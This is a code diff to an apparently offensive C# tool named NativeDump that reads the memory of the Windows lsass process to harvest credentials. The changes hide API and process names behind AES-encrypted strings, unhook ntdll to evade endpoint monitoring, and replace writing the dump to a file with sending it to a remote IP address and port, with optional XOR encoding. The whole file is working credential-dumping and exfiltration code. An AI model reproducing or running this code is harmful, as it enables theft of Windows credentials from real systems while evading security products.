@@ -1,24 +1,36 @@
 ﻿using System;
+using System.Text;
 using System.Diagnostics;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using static NativeDump.Win32;
-using static NativeDump.CreateFile;
+using static NativeDump.SendFile;
+using static NativeDump.Overwrite;
+using System.Net;
+
 
 namespace NativeDump
 {
     internal class Program
     {
-        static void EnableDebugPrivileges()
+        const string strings_aes_password = "NativeDump-AESPW";
+        const string strings_aes_iv = "NativeDump-AESIV";
+        
+        static void EnableDebugPrivileges(IntPtr ntdll_address)
         {
+            string NtOpenProcessToken_decrypted = DecryptStringFromBytes("dVNokQ+FGYftPDVugpCgRXqa8lkYzmmEEI//QbdIAz4=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string NtAdjustPrivilegesToken_decrypted = DecryptStringFromBytes("CHR0P/PWNpc67F9qlSlB83dVpJFKV+q5v8RGncCJkKE=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string NtClose_decrypted = DecryptStringFromBytes("EHbfTz/nCV1Haj37b77KoA==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
             IntPtr currentProcess = Process.GetCurrentProcess().Handle;
             IntPtr tokenHandle = IntPtr.Zero;
+
             try
             {
-                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
+                NtOpenProcessTokenDelegate NtOpenProcessTokenFunction = (NtOpenProcessTokenDelegate)GetFuncDelegate(ntdll_address, NtOpenProcessToken_decrypted, typeof(NtOpenProcessTokenDelegate));
+                uint ntstatus = NtOpenProcessTokenFunction(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                 if (ntstatus != 0)
                 {
-                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                    Console.WriteLine("[-] Error calling " + NtOpenProcessToken_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                     Environment.Exit(-1);
                 }
 
@@ -29,10 +41,11 @@ namespace NativeDump
                     Attributes = 0x00000002
                 };
 
-                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
+                NtAdjustPrivilegesTokenDelegate NtAdjustPrivilegesTokenFunction = (NtAdjustPrivilegesTokenDelegate)GetFuncDelegate(ntdll_address, NtAdjustPrivilegesToken_decrypted, typeof(NtAdjustPrivilegesTokenDelegate));
+                ntstatus = NtAdjustPrivilegesTokenFunction(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                 if (ntstatus != 0)
                 {
-                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
+                    Console.WriteLine("[-] Error calling " + NtAdjustPrivilegesToken_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to run the program as administrator or calculate the LowPart of the LUID using LookupPrivilegeValue");
                     Environment.Exit(-1);
                 }
             }
@@ -40,32 +53,37 @@ namespace NativeDump
             {
                 if (tokenHandle != IntPtr.Zero)
                 {
-                    NtClose(tokenHandle);
+                    NtCloseDelegate NtCloseFunction = (NtCloseDelegate)GetFuncDelegate(ntdll_address, NtClose_decrypted, typeof(NtCloseDelegate));
+                    NtCloseFunction(tokenHandle);
                 }
             }
         }
 
 
-        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
+        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address, IntPtr ntdll_address)
         {
+            string NtReadVirtualMemory_decrypted = DecryptStringFromBytes("XiDvuG2lK8yklpPAu02vkql2TfeetXOCWIf/ZPaQles=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
             byte[] buff = new byte[8];
-            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
+            NtReadVirtualMemoryDelegate NtReadVirtualMemoryFunction = (NtReadVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtReadVirtualMemory_decrypted, typeof(NtReadVirtualMemoryDelegate));
+            uint ntstatus = NtReadVirtualMemoryFunction(hProcess, mem_address, buff, buff.Length, out _);
             if (ntstatus != 0)
             {
-                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                Console.WriteLine("[-] Error calling " + NtReadVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
             }
             long value = BitConverter.ToInt64(buff, 0);
             return (IntPtr)value;
         }
 
 
-        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
+        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address, IntPtr ntdll_address)
         {
+            string NtReadVirtualMemory_decrypted = DecryptStringFromBytes("XiDvuG2lK8yklpPAu02vkql2TfeetXOCWIf/ZPaQles=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
             byte[] buff = new byte[256];
-            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
+            NtReadVirtualMemoryDelegate NtReadVirtualMemoryFunction = (NtReadVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtReadVirtualMemory_decrypted, typeof(NtReadVirtualMemoryDelegate));
+            uint ntstatus = NtReadVirtualMemoryFunction(hProcess, mem_address, buff, buff.Length, out _);
             if (ntstatus != 0)
             {
-                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                Console.WriteLine("[-] Error calling " + NtReadVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
             }
             string unicode_str = "";
             for (int i = 0; i < buff.Length - 1; i += 2)
@@ -77,8 +95,10 @@ namespace NativeDump
         }
 
 
-        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name)
+        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name, IntPtr ntdll_address)
         {
+            string NtQueryInformationProcess_decrypted = DecryptStringFromBytes("p74LC9QWA6qihXsxRK3d4v59VByqTa1cLrM5KZIVkw0=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+
             uint process_basic_information_size = 48;
             int peb_offset = 0x8;
             int ldr_offset = 0x18;
@@ -105,40 +125,37 @@ namespace NativeDump
             {
                 pbi_addr = (IntPtr)p;
 
-                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
+                NtQueryInformationProcessDelegate NtQueryInformationProcessFunction = (NtQueryInformationProcessDelegate)GetFuncDelegate(ntdll_address, NtQueryInformationProcess_decrypted, typeof(NtQueryInformationProcessDelegate));
+                uint ntstatus = NtQueryInformationProcessFunction(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                 if (ntstatus != 0)
                 {
-                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                    Console.WriteLine("[-] Error calling " + NtQueryInformationProcess_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                 }
-                Console.WriteLine("[+] Process_Basic_Information Address: \t\t0x" + pbi_addr.ToString("X"));
             }
 
             // Get PEB Base Address
             IntPtr peb_pointer = pbi_addr + peb_offset;
-            Console.WriteLine("[+] PEB Address Pointer:\t\t\t0x" + peb_pointer.ToString("X"));
             IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
-            Console.WriteLine("[+] PEB Address:\t\t\t\t0x" + pebaddress.ToString("X"));
 
             // Get Ldr 
             IntPtr ldr_pointer = pebaddress + ldr_offset;
-            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
+            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer, ntdll_address);
 
             IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
-            Console.WriteLine("[+] InInitializationOrderModuleList:\t\t0x" + InInitializationOrderModuleList.ToString("X"));
-            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
+            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList, ntdll_address);
 
             IntPtr dll_base = (IntPtr)1337;
             while (dll_base != IntPtr.Zero)
             {
                 next_flink = next_flink - 0x10;
                 // Get DLL base address
-                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
-                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
+                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset), ntdll_address);
+                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset), ntdll_address);
 
-                string base_dll_name = ReadRemoteWStr(hProcess, buffer);
+                string base_dll_name = ReadRemoteWStr(hProcess, buffer, ntdll_address);
 
-                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
-                
+                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10), ntdll_address);
+
                 // Compare with DLL name we are searching
                 if (dll_name.ToLower() == base_dll_name.ToLower())
                 {
@@ -149,11 +166,41 @@ namespace NativeDump
         }
 
 
+        public static OSVERSIONINFOEX getBuildNumber(IntPtr ntdll_address)
+        {
+            string RtlGetVersion_decrypted = DecryptStringFromBytes("/fYVPzm2XqW04lyEgBdrwg==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
+            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
+            RtlGetVersionDelegate RtlGetVersionFunction = (RtlGetVersionDelegate)GetFuncDelegate(ntdll_address, RtlGetVersion_decrypted, typeof(RtlGetVersionDelegate));
+            RtlGetVersionFunction(ref osVersionInfo);
+            return osVersionInfo;
+        }
+
+
         static void Main(string[] args)
         {
-            // Get process name
-            string procname = "lsass";
+            string ipAddress = "127.0.0.1";
+            int portNumber = 8080;
+            bool xor_bytes_bool = false;
+            byte xor_byte = 0xCC;
+
+            string ntdll_decrypted = DecryptStringFromBytes("HSUNIBVhlw/Rk7hngQFg6Q==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv)); // public static void EncryptAux(string str_to_encrypt){Console.WriteLine("string "+ str_to_encrypt + "_decrypted = DecryptStringFromBytes(\"" + EncryptStringToBytes(str_to_encrypt, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv)) + "\", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));");}
+            string lsass_decrypted = DecryptStringFromBytes("AQwDh64onS02pqrocuqyTA==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string lsasrv_dll_decrypted = DecryptStringFromBytes("kQ1NposSj/OgUkeDH6CU9w==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string NtOpenProcess_decrypted = DecryptStringFromBytes("EKXSHKj6YzOcq7il7O6t3Q==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string NtQueryVirtualMemory_decrypted = DecryptStringFromBytes("/rOhe8ZGE+i5znQHLz3fdnOKYN5OKp9IXyQPntuI+sk=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string NtReadVirtualMemory_decrypted = DecryptStringFromBytes("XiDvuG2lK8yklpPAu02vkql2TfeetXOCWIf/ZPaQles=", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
+            string NtClose_decrypted = DecryptStringFromBytes("EHbfTz/nCV1Haj37b77KoA==", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
             
+            // Overwrite ntdll.dll hooked APIs with unhooked versions
+            PatchNtdll();
+
+            // Get process name
+            string procname = lsass_decrypted;
+
+            // Get ntdll address
+            IntPtr ntdll_address = GetLibAddress(ntdll_decrypted);
+
             //Get process PID
             Process[] process_list = Process.GetProcessesByName(procname);
             if (process_list.Length == 0)
@@ -165,7 +212,7 @@ namespace NativeDump
             Console.WriteLine("[+] Process PID: \t\t\t\t" + processPID);
 
             // Get SeDebugPrivilege
-            EnableDebugPrivileges();
+            EnableDebugPrivileges(ntdll_address);
 
             // Get process handle with NtOpenProcess
             IntPtr processHandle = IntPtr.Zero;
@@ -173,10 +220,11 @@ namespace NativeDump
             client_id.UniqueProcess = (IntPtr)processPID;
             client_id.UniqueThread = IntPtr.Zero;
             OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
-            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
+            NtOpenProcessDelegate NtOpenProcessFunction = (NtOpenProcessDelegate)GetFuncDelegate(ntdll_address, NtOpenProcess_decrypted, typeof(NtOpenProcessDelegate));
+            uint ntstatus = NtOpenProcessFunction(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
             if (ntstatus != 0)
             {
-                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                Console.WriteLine("[-] Error calling " + NtOpenProcess_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
             }
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
 
@@ -187,7 +235,7 @@ namespace NativeDump
             List<Memory64Info> mem64info_List = new List<Memory64Info>();
 
             // Get lsasrv.dll information
-            IntPtr lsasrvdll_address = CustomGetModuleHandle(processHandle, "lsasrv.dll");
+            IntPtr lsasrvdll_address = CustomGetModuleHandle(processHandle, lsasrv_dll_decrypted, ntdll_address);
             int lsasrvdll_size = 0;
             bool bool_test = false;
 
@@ -195,10 +243,11 @@ namespace NativeDump
             {
                 // Populate MEMORY_BASIC_INFORMATION struct
                 MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
-                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
+                NtQueryVirtualMemoryDelegate NtQueryVirtualMemoryFunction = (NtQueryVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtQueryVirtualMemory_decrypted, typeof(NtQueryVirtualMemoryDelegate));
+                ntstatus = NtQueryVirtualMemoryFunction(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                 if (ntstatus != 0)
                 {
-                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                    Console.WriteLine("[-] Error calling " + NtQueryVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                 }
 
                 // If readable and commited --> Write memory region to a file
@@ -212,10 +261,11 @@ namespace NativeDump
 
                     // Dump memory
                     byte[] buffer = new byte[(int)mbi.RegionSize];
-                    ntstatus = NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
+                    NtReadVirtualMemoryDelegate NtReadVirtualMemoryFunction = (NtReadVirtualMemoryDelegate)GetFuncDelegate(ntdll_address, NtReadVirtualMemory_decrypted, typeof(NtReadVirtualMemoryDelegate));
+                    ntstatus = NtReadVirtualMemoryFunction(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                     if (ntstatus != 0 && ntstatus != 0x8000000D)
                     {
-                        Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                        Console.WriteLine("[-] Error calling " + NtReadVirtualMemory_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
                     }
                     byte[] new_bytearray = new byte[memory_regions.Length + buffer.Length];
                     Buffer.BlockCopy(memory_regions, 0, new_bytearray, 0, memory_regions.Length);
@@ -244,22 +294,32 @@ namespace NativeDump
             }
 
             // Get file name
-            string dumpfile = "proc_" + processPID + ".dmp";
-            if (args.Length > 0)
+            
+            
+            if (args.Length > 1)
             {
-                dumpfile = args[0];
+                ipAddress = args[0];
+                portNumber = Convert.ToInt32(args[1]);
+            }
+            if (args.Length > 2)
+            {
+                if (args[2] == "xor") {
+                    xor_bytes_bool = true;
+                }
             }
 
             // Generate Minidump file
-            Console.WriteLine("[+] Lsasrv.dll Address:\t\t\t\t0x" + lsasrvdll_address.ToString("X"));
-            Console.WriteLine("[+] Lsasrv.dll Size:   \t\t\t\t0x" + lsasrvdll_size.ToString("X"));
-            CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, memory_regions, dumpfile);
+            OSVERSIONINFOEX osVersionInfo = getBuildNumber(ntdll_address);
+            Console.WriteLine("[+] " + lsasrv_dll_decrypted + " Address:\t\t\t\t0x" + lsasrvdll_address.ToString("X"));
+            Console.WriteLine("[+] " + lsasrv_dll_decrypted + " Size:   \t\t\t\t0x" + lsasrvdll_size.ToString("X"));
+            Send(lsasrvdll_address, lsasrvdll_size, lsasrv_dll_decrypted, mem64info_List, memory_regions, osVersionInfo, ipAddress, portNumber, xor_bytes_bool, xor_byte);
 
             // Close process handle
-            ntstatus = NtClose(processHandle);
+            NtCloseDelegate NtCloseFunction = (NtCloseDelegate)GetFuncDelegate(ntdll_address, NtClose_decrypted, typeof(NtCloseDelegate));
+            ntstatus = NtCloseFunction(processHandle);
             if (ntstatus != 0)
             {
-                Console.WriteLine("[-] Error calling NtClose. NTSTATUS: 0x" + ntstatus.ToString("X"));
+                Console.WriteLine("[-] Error calling " + NtClose_decrypted + ". NTSTATUS: 0x" + ntstatus.ToString("X"));
             }
         }
     }
